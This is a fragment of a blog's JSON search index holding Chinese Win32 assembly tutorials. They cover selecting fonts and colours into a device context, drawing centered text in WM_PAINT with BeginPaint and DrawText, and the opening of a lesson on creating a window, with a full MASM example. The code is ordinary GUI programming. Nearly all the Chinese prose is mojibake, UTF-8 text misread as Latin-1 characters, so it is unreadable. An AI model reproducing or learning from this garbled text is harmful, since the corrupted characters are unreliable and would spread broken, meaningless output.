ä¸€èˆ¬é€‰ç”¨OUT_DEFAULT_PRECISï¼Œå®ƒå†³å®šäº†ç¼ºçœçš„æ˜ å°„æ–¹å¼ã€‚ cClipPrecisionï¼š æŒ‡å®šæˆ‘ä»¬é€‰æ‹©çš„å­—ä½“åœ¨è¶…å‡ºè£å‰ªåŒºåŸŸæ—¶çš„è£å‰ªç²¾åº¦ã€‚ ä¸€èˆ¬é€‰ç”¨CLIP_DEFAULT_PRECISï¼Œå®ƒå†³å®šäº†è£å‰ªç²¾åº¦ã€‚ cQualityï¼š æŒ‡å®šè¾“å‡ºå­—ä½“çš„è´¨é‡ã€‚å®ƒæŒ‡å‡ºGDIåº”å¦‚ä½•å°½å¯èƒ½çš„æ¥è¿‘çœŸå® å­—ä½“ï¼Œä¸€å…±æœ‰ä¸‰ç§æ–¹å¼ï¼šDEFAULT_QUALITYï¼Œ PROOF_QUALITY å’ŒDRAFT_QUALITYã€‚ cPitchAndFamilyï¼šå­—å‹å’Œå­—ä½“å®¶æ—ã€‚ lpFacenameï¼š æŒ‡å®šå­—ä½“çš„åç§°ã€‚ ä¸Šé¢çš„æè¿°ä¸ä¸€å®šå¥½ç†è§£ï¼Œæ‚¨å¦‚æœè¦çš„åˆ°æ›´å¤šçš„ä¿¡æ¯ï¼Œåº”å‚è€ƒ WIN32 API æŒ‡å—ã€‚\n1 2 invoke SelectObjectï¼Œ hdcï¼Œ eax mov hfontï¼Œeax åœ¨æˆ‘ä»¬å¾—åˆ°äº†æŒ‡å‘é€»è¾‘å­—ä½“çš„å¥æŸ„åå¿…é¡»è°ƒç”¨ SelectObject å‡½æ•°æŠŠå®ƒé€‰æ‹©è¿›â€œè®¾å¤‡ç¯å¢ƒâ€ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è°ƒç”¨è¯¥å‡½æ•°æŠŠè¯¸å¦‚æ­¤ç±»çš„åƒé¢œè‰²ã€ç¬”ã€ç”»åˆ· ç­‰GDIå¯¹è±¡é€‰è¿›â€œè®¾å¤‡ç¯å¢ƒâ€ã€‚è¯¥å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªæ—§çš„â€œè®¾å¤‡ç¯å¢ƒâ€çš„å¥æŸ„ã€‚æ‚¨å¿…é¡»ä¿å­˜è¯¥å¥æŸ„ï¼Œä»¥ä¾¿åœ¨å®Œæˆâ€œç»˜åˆ¶â€å·¥ä½œåå†æŠŠå®ƒé€‰å›ã€‚åœ¨è°ƒç”¨ SelectObject å‡½æ•°åä¸€åˆ‡çš„ç»˜åˆ¶å‡½æ•°éƒ½æ˜¯é’ˆå¯¹è¯¥â€œè®¾å¤‡ç¯å¢ƒâ€çš„ã€‚\n1 2 3 4 RGB 200ï¼Œ200ï¼Œ50 invoke SetTextColorï¼Œhdcï¼Œeax RGB 0ï¼Œ0ï¼Œ255 invoke SetBkColorï¼Œhdcï¼Œeax æˆ‘ä»¬ç”¨å® RGB äº§ç”Ÿé¢œè‰²ï¼Œç„¶ååˆ†åˆ«è°ƒç”¨ SetTextColor å’Œ SetBkColorã€‚\n1 invoke TextOutï¼Œhdcï¼Œ0ï¼Œ0ï¼ŒADDR TestStringï¼ŒSIZEOF TestString æˆ‘ä»¬è°ƒç”¨ TextOut åœ¨å®¢æˆ·åŒºç”¨æˆ‘ä»¬å‰é¢é€‰å®šçš„å­—ä½“å’Œé¢œè‰²â€œç»˜åˆ¶â€æ–‡æœ¬ä¸²ã€‚ TextOut,hdc,x,y,lpString,nCount\n1 invoke SelectObjectï¼Œhdcï¼Œ hfont åœ¨æˆ‘ä»¬â€œç»˜åˆ¶â€å®Œæˆåï¼Œå¿…é¡»æ¢å¤â€œè®¾å¤‡ç¯å¢ƒâ€ã€‚\næµ‹è¯•å›¾ ","permalink":"https://www.hacktech.cn/post/win32-asm-5-draw-text.html","summary":"\u003cp\u003eè¿™æ¬¡æˆ‘ä»¬å°†å­¦ä¹ æœ‰å…³æ–‡æœ¬çš„è¯¸å¤šå±æ€§å¦‚å­—ä½“å’Œé¢œè‰²ç­‰ã€‚\u003c/p\u003e","title":"Win32æ±‡ç¼–å­¦ä¹ (5)ï¼šç»˜åˆ¶æ–‡æœ¬2"},{"content":"è¿™æ¬¡ï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•åœ¨çª—å£çš„å®¢æˆ·åŒºâ€œç»˜åˆ¶â€å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬è¿˜å°†å­¦ä¹ å…³äºâ€œè®¾å¤‡ç¯å¢ƒâ€çš„æ¦‚å¿µã€‚\nç†è®ºï¼š â€œç»˜åˆ¶â€å­—ç¬¦ä¸² Windows ä¸­çš„æ–‡æœ¬æ˜¯ä¸€ä¸ªGUIï¼ˆå›¾å½¢ç”¨æˆ·ç•Œé¢ï¼‰å¯¹è±¡ã€‚æ¯ä¸€ä¸ªå­—ç¬¦å®é™…ä¸Šæ˜¯ç”±è®¸å¤šçš„åƒç´ ç‚¹ç»„æˆï¼Œè¿™äº›ç‚¹åœ¨æœ‰ç¬”ç”»çš„åœ°æ–¹æ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™æ ·å°±ä¼šå‡ºç°å­—ç¬¦ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘è¯´â€œç»˜åˆ¶â€å­—ç¬¦ï¼Œè€Œä¸æ˜¯å†™å­—ç¬¦ã€‚é€šå¸¸æ‚¨éƒ½æ˜¯åœ¨æ‚¨åº”ç”¨ç¨‹åºçš„å®¢æˆ·åŒºâ€œç»˜åˆ¶â€å­—ç¬¦ä¸²ï¼ˆå°½ç®¡æ‚¨ä¹Ÿå¯ä»¥åœ¨å®¢æˆ·åŒºå¤–â€œç»˜åˆ¶â€ï¼‰ã€‚Windows ä¸‹çš„â€œç»˜åˆ¶â€å­—ç¬¦ä¸²æ–¹æ³•å’Œ Dos ä¸‹çš„æˆªç„¶ä¸åŒï¼Œåœ¨ Dos ä¸‹ï¼Œæ‚¨å¯ä»¥æŠŠå±å¹•æƒ³è±¡æˆ 85 x 25 çš„ä¸€ä¸ªå¹³é¢ï¼Œè€Œ Windows ä¸‹ç”±äºå±å¹•ä¸ŠåŒæ—¶æœ‰å‡ ä¸ªåº”ç”¨ç¨‹åºçš„ç”»é¢ï¼Œæ‰€ä»¥æ‚¨å¿…é¡»ä¸¥æ ¼éµä»è§„èŒƒã€‚Windows é€šè¿‡æŠŠæ¯ä¸€ä¸ªåº”ç”¨ç¨‹åºé™åˆ¶åœ¨ä»–çš„å®¢æˆ·åŒºæ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚å½“ç„¶å®¢æˆ·åŒºçš„å¤§å°æ˜¯å¯å˜çš„ï¼Œæ‚¨éšæ—¶å¯ä»¥è°ƒæ•´ã€‚\nåœ¨æ‚¨åœ¨å®¢æˆ·åŒºâ€œç»˜åˆ¶â€å­—ç¬¦ä¸²å‰ï¼Œæ‚¨å¿…é¡»ä» Windows é‚£é‡Œå¾—åˆ°æ‚¨å®¢æˆ·åŒºçš„å¤§å°ï¼Œç¡®å®æ‚¨æ— æ³•åƒåœ¨ DOS ä¸‹é‚£æ ·éšå¿ƒæ‰€æ¬²åœ°åœ¨å±å¹•ä¸Šä»»ä½•åœ°æ–¹â€œç»˜åˆ¶â€ï¼Œç»˜åˆ¶å‰æ‚¨å¿…é¡»å¾—åˆ° Windows çš„å…è®¸ï¼Œç„¶å Windows ä¼šå‘Šè¯‰æ‚¨å®¢æˆ·åŒºçš„å¤§å°ï¼Œå­—ä½“ï¼Œé¢œè‰²å’Œå…¶å®ƒ GUI å¯¹è±¡çš„å±æ€§ã€‚æ‚¨å¯ä»¥ç”¨è¿™äº›æ¥åœ¨å®¢æˆ·åŒºâ€œç»˜åˆ¶â€ã€‚\nè®¾å¤‡ç¯å¢ƒ ä»€ä¹ˆæ˜¯â€œè®¾å¤‡ç¯å¢ƒâ€ï¼ˆDCï¼‰å‘¢ï¼Ÿ å®ƒå…¶å®æ˜¯ç”± Windows å†…éƒ¨ç»´æŠ¤çš„ä¸€ä¸ªæ•°æ®ç»“æ„ã€‚ä¸€ä¸ªâ€œè®¾å¤‡ç¯å¢ƒâ€å’Œä¸€ä¸ªç‰¹å®šçš„è®¾å¤‡ç›¸è¿ã€‚åƒæ‰“å°æœºå’Œæ˜¾ç¤ºå™¨ã€‚å¯¹äºæ˜¾ç¤ºå™¨æ¥è¯´ï¼Œâ€œè®¾å¤‡ç¯å¢ƒâ€å’Œä¸€ä¸ªä¸ªç‰¹å®šçš„çª—å£ç›¸è¿ã€‚\nâ€œè®¾å¤‡ç¯å¢ƒâ€ä¸­çš„æœ‰äº›å±æ€§å’Œç»˜å›¾æœ‰å…³ï¼Œåƒï¼šé¢œè‰²ï¼Œå­—ä½“ç­‰ã€‚æ‚¨å¯ä»¥éšæ—¶æ”¹åŠ¨é‚£äº›ç¼ºçœå€¼ï¼Œä¹‹æ‰€ä»¥ä¿å­˜ç¼ºçœå€¼æ˜¯ä¸ºäº†æ–¹ä¾¿ã€‚æ‚¨å¯ä»¥æŠŠâ€œè®¾å¤‡ç¯å¢ƒâ€æƒ³è±¡æˆæ˜¯Windows ä¸ºæ‚¨å‡†å¤‡çš„ä¸€ä¸ªç»˜å›¾ç¯å¢ƒï¼Œè€Œæ‚¨å¯ä»¥éšæ—¶æ ¹æ®éœ€è¦æ”¹å˜æŸäº›ç¼ºçœå±æ€§ã€‚\nå½“åº”ç”¨ç¨‹åºéœ€è¦ç»˜åˆ¶æ—¶ï¼Œæ‚¨å¿…é¡»å¾—åˆ°ä¸€ä¸ªâ€œè®¾å¤‡ç¯å¢ƒâ€çš„å¥æŸ„ã€‚é€šå¸¸æœ‰å‡ ç§æ–¹æ³•ã€‚\nåœ¨ WM_PAINT æ¶ˆæ¯ä¸­ä½¿ç”¨ call BeginPaint åœ¨å…¶ä»–æ¶ˆæ¯ä¸­ä½¿ç”¨ call GetDC call CreateDC å»ºç«‹ä½ è‡ªå·±çš„ DC æ‚¨å¿…é¡»ç‰¢è®°çš„æ˜¯ï¼Œåœ¨å¤„ç†å•ä¸ªæ¶ˆæ¯åä½ å¿…é¡»é‡Šæ”¾â€œè®¾å¤‡ç¯å¢ƒâ€å¥æŸ„ã€‚ä¸è¦åœ¨ä¸€ä¸ªæ¶ˆæ¯å¤„ç†ä¸­è·å¾— â€œè®¾å¤‡ç¯å¢ƒâ€å¥æŸ„ï¼Œè€Œåœ¨å¦ä¸€ä¸ªæ¶ˆæ¯å¤„ç†ä¸­åœ¨é‡Šæ”¾å®ƒã€‚\næˆ‘ä»¬åœ¨Windows å‘é€ WM_PAINT æ¶ˆæ¯æ—¶å¤„ç†ç»˜åˆ¶å®¢æˆ·åŒºï¼ŒWindows ä¸ä¼šä¿å­˜å®¢æˆ·åŒºçš„å†…å®¹ï¼Œå®ƒç”¨çš„æ˜¯æ–¹æ³•æ˜¯â€œé‡ç»˜â€æœºåˆ¶ï¼ˆè­¬å¦‚å½“å®¢æˆ·åŒºåˆšè¢«å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºçš„å®¢æˆ·åŒºè¦†ç›–ï¼‰ï¼ŒWindows ä¼šæŠŠ WM_PAINT æ¶ˆæ¯æ”¾å…¥è¯¥åº”ç”¨ç¨‹åºçš„æ¶ˆæ¯é˜Ÿåˆ—ã€‚é‡ç»˜çª—å£çš„å®¢æˆ·åŒºæ˜¯å„ä¸ªçª—å£è‡ªå·±çš„è´£ä»»ï¼Œæ‚¨è¦åšçš„æ˜¯åœ¨çª—å£è¿‡ç¨‹å¤„ç† WM_PAINT çš„éƒ¨åˆ†çŸ¥é“ç»˜åˆ¶ä»€ä¹ˆå’Œä½•å¦‚ç»˜åˆ¶ã€‚\næ‚¨å¿…é¡»äº†è§£çš„å¦ä¸€ä¸ªæ¦‚å¿µæ˜¯â€œæ— æ•ˆåŒºåŸŸâ€ã€‚Windows æŠŠä¸€ä¸ªæœ€å°çš„éœ€è¦é‡ç»˜çš„æ­£æ–¹å½¢åŒºåŸŸå«åšâ€œæ— æ•ˆåŒºåŸŸâ€ã€‚å½“ Windows å‘ç°äº†ä¸€ä¸ªâ€æ— æ•ˆåŒºåŸŸâ€œåï¼Œå®ƒå°±ä¼šå‘è¯¥åº”ç”¨ç¨‹åºå‘é€ä¸€ä¸ª WM_PAINT æ¶ˆæ¯ï¼Œåœ¨ WM_PAINT çš„å¤„ç†è¿‡ç¨‹ä¸­ï¼Œçª—å£é¦–å…ˆå¾—åˆ°ä¸€ä¸ªæœ‰å…³ç»˜å›¾çš„ç»“æ„ä½“ï¼Œé‡Œé¢åŒ…æ‹¬æ— æ•ˆåŒºçš„åæ ‡ä½ç½®ç­‰ã€‚æ‚¨å¯ä»¥é€šè¿‡è°ƒç”¨ BeginPaint è®©â€œæ— æ•ˆåŒºâ€æœ‰æ•ˆï¼Œå¦‚æœæ‚¨ä¸å¤„ç† WM_PAINT æ¶ˆæ¯ï¼Œè‡³å°‘è¦è°ƒç”¨ç¼ºçœçš„çª—å£å¤„ç†å‡½æ•° DefWindowProc ï¼Œæˆ–è€…è°ƒç”¨ ValidateRect è®©â€œæ— æ•ˆåŒºâ€æœ‰æ•ˆã€‚å¦åˆ™æ‚¨çš„åº”ç”¨ç¨‹åºå°†ä¼šæ”¶åˆ°æ— ç©·æ— å°½çš„ WM_PAINT æ¶ˆæ¯ã€‚\nä¸‹é¢æ˜¯å“åº”è¯¥æ¶ˆæ¯çš„æ­¥éª¤ï¼š\nå–å¾—â€œè®¾å¤‡ç¯å¢ƒâ€å¥æŸ„ ç»˜åˆ¶å®¢æˆ·åŒº é‡Šæ”¾â€œè®¾å¤‡ç¯å¢ƒâ€å¥æŸ„ æ³¨æ„ï¼Œæ‚¨æ— é¡»æ˜¾å¼åœ°è®©â€œæ— æ•ˆåŒºâ€æœ‰æ•ˆï¼Œè¿™ä¸ªåŠ¨ä½œç”± BeginPaint è‡ªåŠ¨å®Œæˆã€‚æ‚¨å¯ä»¥åœ¨ BeginPaint å’Œ Endpaint ä¹‹é—´ï¼Œè°ƒç”¨æ‰€æœ‰çš„ç»˜åˆ¶å‡½æ•°ã€‚å‡ ä¹æ‰€æœ‰çš„ GDI å‡½æ•°éƒ½éœ€è¦â€œè®¾å¤‡ç¯å¢ƒâ€çš„å¥æŸ„ä½œä¸ºå‚æ•°ã€‚\nå†…å®¹ï¼š æˆ‘ä»¬å°†å†™ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œå®ƒä¼šåœ¨å®¢æˆ·åŒºçš„ä¸­å¿ƒæ˜¾ç¤ºä¸€è¡Œ \u0026ldquo;Win32 æ±‡ç¼–éå¸¸æœ‰æ„æ€\u0026rdquo;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 .386 .model flat,stdcall option casemap:none WinMain proto :DWORD,:DWORD,:DWORD,:DWORD include \\masm32\\include\\windows.inc include \\masm32\\include\\user32.inc includelib \\masm32\\lib\\user32.lib include \\masm32\\include\\kernel32.inc includelib \\masm32\\lib\\kernel32.lib .DATA ClassName db \u0026#34;SimpleWinClass\u0026#34;,0 AppName db \u0026#34;Our Second Window\u0026#34;,0 OurText db \u0026#34;Win32 æ±‡ç¼–éå¸¸æœ‰æ„æ€\u0026#34;,0 .DATA? hInstance HINSTANCE ? CommandLine LPSTR ? .CODE start: invoke GetModuleHandle, NULL mov hInstance,eax invoke GetCommandLine mov CommandLine,eax invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT invoke ExitProcess,eax WinMain proc hInst:HINSTANCE, hPrevInst:HINSTANCE, CmdLine:LPSTR, CmdShow:DWORD LOCAL wc:WNDCLASSEX LOCAL msg:MSG LOCAL hwnd:HWND mov wc.cbSize,SIZEOF WNDCLASSEX mov wc.style, CS_HREDRAW or CS_VREDRAW mov wc.lpfnWndProc, OFFSET WndProc mov wc.cbClsExtra,NULL mov wc.cbWndExtra,NULL push hInst pop wc.hInstance mov wc.hbrBackground,COLOR_WINDOW+1 mov wc.lpszMenuName,NULL mov wc.lpszClassName,OFFSET ClassName invoke LoadIcon,NULL,IDI_APPLICATION mov wc.hIcon,eax mov wc.hIconSm,eax invoke LoadCursor,NULL,IDC_ARROW mov wc.hCursor,eax invoke RegisterClassEx, addr wc invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\\ WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\\ CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\\ hInst,NULL mov hwnd,eax invoke ShowWindow, hwnd,SW_SHOWNORMAL invoke UpdateWindow, hwnd .WHILE TRUE invoke GetMessage, ADDR msg,NULL,0,0 .BREAK .IF (!eax) invoke TranslateMessage, ADDR msg invoke DispatchMessage, ADDR msg .ENDW mov eax,msg.wParam ret WinMain endp WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM LOCAL hdc:HDC LOCAL ps:PAINTSTRUCT LOCAL rect:RECT .IF uMsg==WM_DESTROY invoke PostQuitMessage,NULL .ELSEIF uMsg==WM_PAINT invoke BeginPaint,hWnd, ADDR ps mov hdc,eax invoke GetClientRect,hWnd, ADDR rect invoke DrawText, hdc,ADDR OurText,-1, ADDR rect, \\ DT_SINGLELINE or DT_CENTER or DT_VCENTER invoke EndPaint,hWnd, ADDR ps .ELSE invoke DefWindowProc,hWnd,uMsg,wParam,lParam ret .ENDIF xor eax, eax ret WndProc endp end start åˆ†æï¼š è¿™é‡Œçš„å¤§å¤šæ•°ä»£ç å’ŒWin32æ±‡ç¼–å­¦ä¹ (3)ï¼šç®€å•çš„çª—å£ä¸­çš„ä¸€æ ·ã€‚æˆ‘åªè§£é‡Šå…¶ä¸­ä¸€äº›ä¸ç›¸åŒçš„åœ°æ–¹ã€‚\n1 2 3 LOCAL hdcï¼šHDC LOCAL psï¼šPAINTSTRUCT LOCAL rectï¼šRECT è¿™äº›å±€éƒ¨å˜é‡ç”±å¤„ç† WM_PAINT æ¶ˆæ¯ä¸­çš„ GDI å‡½æ•°è°ƒç”¨ã€‚hdc ç”¨æ¥å­˜æ”¾è°ƒç”¨ BeginPaint è¿”å›çš„â€œè®¾å¤‡ç¯å¢ƒâ€å¥æŸ„ã€‚ps æ˜¯ä¸€ä¸ª PAINTSTRUCT æ•°æ®ç±»å‹çš„å˜é‡ã€‚é€šå¸¸æ‚¨ä¸ä¼šç”¨åˆ°å…¶ä¸­çš„è®¸å¤šå€¼ï¼Œå®ƒç”± Windows ä¼ é€’ç»™ BeginPaintï¼Œåœ¨ç»“æŸç»˜åˆ¶åå†åŸå°ä¸åŠ¨çš„ä¼ é€’ç»™ EndPaintã€‚rect æ˜¯ä¸€ä¸ª RECT ç»“æ„ä½“ç±»å‹å‚æ•°ï¼Œå®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š\n1 2 3 4 5 RECT Struct left LONG ? top LONG ? right LONG ? bottom LONG ? RECT ends left å’Œ top æ˜¯æ­£æ–¹å½¢å·¦ä¸Šè§’çš„åæ ‡ã€‚right å’Œ bottom æ˜¯æ­£æ–¹å½¢å³ä¸‹è§’çš„åæ ‡ã€‚å®¢æˆ·åŒºçš„å·¦ä¸Šè§’çš„åæ ‡æ˜¯ x=0ï¼Œy=0ï¼Œè¿™æ ·å¯¹äº x=0ï¼Œy=10 çš„åæ ‡ç‚¹å°±åœ¨å®ƒçš„ä¸‹é¢ã€‚\n1 2 3 4 5 6 invoke BeginPaintï¼ŒhWndï¼Œ ADDR ps mov hdcï¼Œeax invoke GetClientRectï¼ŒhWndï¼Œ ADDR rect invoke DrawTextï¼Œ hdcï¼ŒADDR OurTextï¼Œ-1ï¼Œ ADDR rectï¼Œ \\ DT_SINGLELINE or DT_CENTER or DT_VCENTER invoke EndPaintï¼ŒhWndï¼Œ ADDR ps åœ¨å¤„ç† WM_PAINT æ¶ˆæ¯æ—¶ï¼Œæ‚¨è°ƒç”¨BeginPaintå‡½æ•°ï¼Œä¼ ç»™å®ƒä¸€ä¸ªçª—å£å¥æŸ„å’Œæœªåˆå§‹åŒ–çš„ PAINTSTRUCT å‹å‚æ•°ã€‚è°ƒç”¨æˆåŠŸååœ¨ eax ä¸­è¿”å›â€œè®¾å¤‡ç¯å¢ƒâ€çš„å¥æŸ„ã€‚ä¸‹ä¸€æ¬¡ï¼Œè°ƒç”¨ GetClientRect ä»¥å¾—åˆ°å®¢æˆ·åŒºçš„å¤§å°ï¼Œå¤§å°æ”¾åœ¨ rect ä¸­ï¼Œç„¶åæŠŠå®ƒä¼ ç»™ DrawTextã€‚DrawText çš„è¯­æ³•å¦‚ä¸‹ï¼š\n1 DrawText proto hdcï¼šHDCï¼Œ lpStringï¼šDWORDï¼Œ nCountï¼šDWORDï¼Œ lpRectï¼šDWORDï¼Œ uFormatï¼šDWORD DrawTextæ˜¯ä¸€ä¸ªé«˜å±‚çš„è°ƒç”¨å‡½æ•°ã€‚å®ƒèƒ½è‡ªåŠ¨å¤„ç†åƒæ¢è¡Œã€æŠŠæ–‡æœ¬æ”¾åˆ°å®¢æˆ·åŒºä¸­é—´ç­‰è¿™äº›æ‚äº‹ã€‚æ‰€ä»¥æ‚¨åªç®¡é›†ä¸­ç²¾åŠ›â€œç»˜åˆ¶â€å­—ç¬¦ä¸²å°±å¯ä»¥äº†ã€‚è®©æˆ‘ä»¬æ¥çœ‹ä¸€çœ‹è¯¥å‡½æ•°çš„å‚æ•°ï¼š\nhdcï¼š â€œè®¾å¤‡ç¯å¢ƒâ€çš„å¥æŸ„ã€‚ lpStringï¼šè¦æ˜¾ç¤ºçš„æ–‡æœ¬ä¸²ï¼Œè¯¥æ–‡æœ¬ä¸²è¦ä¹ˆä»¥NULLç»“å°¾ï¼Œè¦ä¹ˆåœ¨nCountä¸­æŒ‡å‡ºå®ƒçš„é•¿çŸ­ã€‚ nCountï¼šè¦è¾“å‡ºçš„æ–‡æœ¬çš„é•¿åº¦ã€‚è‹¥ä»¥NULLç»“å°¾ï¼Œè¯¥å‚æ•°å¿…é¡»æ˜¯-1ã€‚ lpRectï¼š æŒ‡å‘è¦è¾“å‡ºæ–‡æœ¬ä¸²çš„æ­£æ–¹å½¢åŒºåŸŸçš„æŒ‡é’ˆï¼Œè¯¥æ–¹å½¢å¿…é¡»æ˜¯ä¸€ä¸ªè£å‰ªåŒºï¼Œä¹Ÿå°±æ˜¯è¯´è¶…è¿‡è¯¥åŒºåŸŸçš„å­—ç¬¦å°†ä¸èƒ½æ˜¾ç¤ºã€‚ uFormatï¼šæŒ‡å®šå¦‚ä½•æ˜¾ç¤ºã€‚æˆ‘ä»¬å¯ä»¥ç”¨ or æŠŠä»¥ä¸‹æ ‡å¿—æˆ–åˆ°ä¸€å—ï¼š DT_SINGLELINEï¼šæ˜¯å¦å•è¡Œæ˜¾ç¤ºã€‚ DT_CENTERï¼šæ˜¯å¦æ°´å¹³å±…ä¸­ã€‚ DT_VCENTER ï¼šæ˜¯å¦å‚ç›´å±…ä¸­ã€‚ ç»“æŸç»˜åˆ¶åï¼Œå¿…é¡»è°ƒç”¨ EndPaint é‡Šæ”¾â€œè®¾å¤‡ç¯å¢ƒâ€çš„å¥æŸ„ã€‚ å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬æŠŠâ€œç»˜åˆ¶â€æ–‡æœ¬ä¸²çš„è¦ç‚¹æ€»ç»“å¦‚ä¸‹ï¼š\nå¿…é¡»åœ¨å¼€å§‹å’Œç»“æŸå¤„åˆ†åˆ«è°ƒç”¨ BeginPaint å’Œ EndPaintï¼› åœ¨ BeginPaint å’Œ EndPaint ä¹‹é—´è°ƒç”¨æ‰€æœ‰çš„ç»˜åˆ¶å‡½æ•°ï¼› å¦‚æœåœ¨å…¶å®ƒçš„æ¶ˆæ¯å¤„ç†ä¸­é‡æ–°ç»˜åˆ¶å®¢æˆ·åŒºï¼Œæ‚¨å¯ä»¥æœ‰ä¸¤ç§é€‰æ‹©ï¼š ç”¨GetDCå’ŒReleaseDCä»£æ›¿BeginPaintå’ŒEndPaintï¼› è°ƒç”¨InvalidateRectæˆ–UpdateWindowè®©å®¢æˆ·åŒºæ— æ•ˆï¼Œè¿™å°†è¿«ä½¿WINDOWSæŠŠWM_PAINTæ”¾å…¥åº”ç”¨ç¨‹åºæ¶ˆæ¯é˜Ÿåˆ—ï¼Œä»è€Œä½¿å¾—å®¢æˆ·åŒºé‡ç»˜ã€‚ ","permalink":"https://www.hacktech.cn/post/win32-asm-4-draw-text.html","summary":"\u003cp\u003eè¿™æ¬¡ï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•åœ¨çª—å£çš„å®¢æˆ·åŒºâ€œç»˜åˆ¶â€å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬è¿˜å°†å­¦ä¹ å…³äºâ€œè®¾å¤‡ç¯å¢ƒâ€çš„æ¦‚å¿µã€‚\u003c/p\u003e","title":"Win32æ±‡ç¼–å­¦ä¹ (4)ï¼šç»˜åˆ¶æ–‡æœ¬"},{"content":"è¿™æ¬¡æˆ‘ä»¬å°†å†™ä¸€ä¸ª Windows ç¨‹åºï¼Œå®ƒä¼šåœ¨æ¡Œé¢æ˜¾ç¤ºä¸€ä¸ªæ ‡å‡†çš„çª—å£ï¼Œä»¥æ­¤æ ¹æ®ä»£ç æ¥å­¦ä¹ å¦‚ä½•åˆ›å»ºä¸€ä¸ªç®€å•çš„çª—å£ã€‚\nç†è®ºï¼š Windows ç¨‹åºä¸­ï¼Œåœ¨å†™å›¾å½¢ç”¨æˆ·ç•Œé¢æ—¶éœ€è¦è°ƒç”¨å¤§é‡çš„æ ‡å‡† Windows Gui å‡½æ•°ã€‚å…¶å®è¿™å¯¹ç”¨æˆ·å’Œç¨‹åºå‘˜æ¥è¯´éƒ½æœ‰å¥½å¤„ï¼Œå¯¹äºç”¨æˆ·ï¼Œé¢å¯¹çš„æ˜¯åŒä¸€å¥—æ ‡å‡†çš„çª—å£ï¼Œå¯¹è¿™äº›çª—å£çš„æ“ä½œéƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ä½¿ç”¨ä¸åŒçš„åº”ç”¨ç¨‹åºæ—¶æ— é¡»é‡æ–°å­¦ä¹ æ“ä½œã€‚å¯¹ç¨‹åºå‘˜æ¥è¯´ï¼Œè¿™äº› Gui æºä»£ç éƒ½æ˜¯ç»è¿‡äº†å¾®è½¯çš„ä¸¥æ ¼æµ‹è¯•ï¼Œéšæ—¶æ‹¿æ¥å°±å¯ä»¥ç”¨çš„ã€‚å½“ç„¶è‡³äºå…·ä½“åœ°å†™ç¨‹åºå¯¹äºç¨‹åºå‘˜æ¥è¯´è¿˜æ˜¯æœ‰éš¾åº¦çš„ã€‚ä¸ºäº†åˆ›å»ºåŸºäºçª—å£çš„åº”ç”¨ç¨‹åºï¼Œå¿…é¡»ä¸¥æ ¼éµå®ˆè§„èŒƒã€‚åšåˆ°è¿™ä¸€ç‚¹å¹¶ä¸éš¾ï¼Œåªè¦ç”¨æ¨¡å—åŒ–æˆ–é¢å‘å¯¹è±¡çš„ç¼–ç¨‹æ–¹æ³•å³å¯ã€‚\nä¸‹é¢æˆ‘å°±åˆ—å‡ºåœ¨æ¡Œé¢æ˜¾ç¤ºä¸€ä¸ªçª—å£çš„å‡ ä¸ªæ­¥éª¤ï¼š\nå¾—åˆ°æ‚¨åº”ç”¨ç¨‹åºçš„å¥æŸ„(å¿…éœ€)ï¼› å¾—åˆ°å‘½ä»¤è¡Œå‚æ•°(å¦‚æœæ‚¨æƒ³ä»å‘½ä»¤è¡Œå¾—åˆ°å‚æ•°ï¼Œå¯é€‰)ï¼› æ³¨å†Œçª—å£ç±»(å¿…éœ€ï¼Œé™¤éæ‚¨ä½¿ç”¨ Windows é¢„å®šä¹‰çš„çª—å£ç±»ï¼Œå¦‚ MessageBox æˆ– dialog boxï¼› äº§ç”Ÿçª—å£(å¿…éœ€)ï¼› åœ¨æ¡Œé¢æ˜¾ç¤ºçª—å£(å¿…éœ€ï¼Œé™¤éæ‚¨ä¸æƒ³ç«‹å³æ˜¾ç¤ºå®ƒ)ï¼› åˆ·æ–°çª—å£å®¢æˆ·åŒºï¼› è¿›å…¥æ— é™çš„è·å–çª—å£æ¶ˆæ¯çš„å¾ªç¯ï¼› å¦‚æœæœ‰æ¶ˆæ¯åˆ°è¾¾ï¼Œç”±è´Ÿè´£è¯¥çª—å£çš„çª—å£å›è°ƒå‡½æ•°å¤„ç†ï¼› å¦‚æœç”¨æˆ·å…³é—­çª—å£ï¼Œè¿›è¡Œé€€å‡ºå¤„ç†ã€‚ ç›¸å¯¹äºå•ç”¨æˆ·çš„ DOS ä¸‹çš„ç¼–ç¨‹æ¥è¯´ï¼ŒWindows ä¸‹çš„ç¨‹åºæ¡†æ¶ç»“æ„æ˜¯ç›¸å½“å¤æ‚çš„ã€‚ä½†æ˜¯ Windows å’Œ DOS åœ¨ç³»ç»Ÿæ¶æ„ä¸Šæ˜¯æˆªç„¶ä¸åŒçš„ã€‚Windows æ˜¯ä¸€ä¸ªå¤šä»»åŠ¡çš„æ“ä½œç³»ç»Ÿï¼Œæ•…ç³»ç»Ÿä¸­åŒæ—¶æœ‰å¤šä¸ªåº”ç”¨ç¨‹åºå½¼æ­¤ååŒè¿è¡Œã€‚è¿™å°±è¦æ±‚ Windows ç¨‹åºå‘˜å¿…é¡»ä¸¥æ 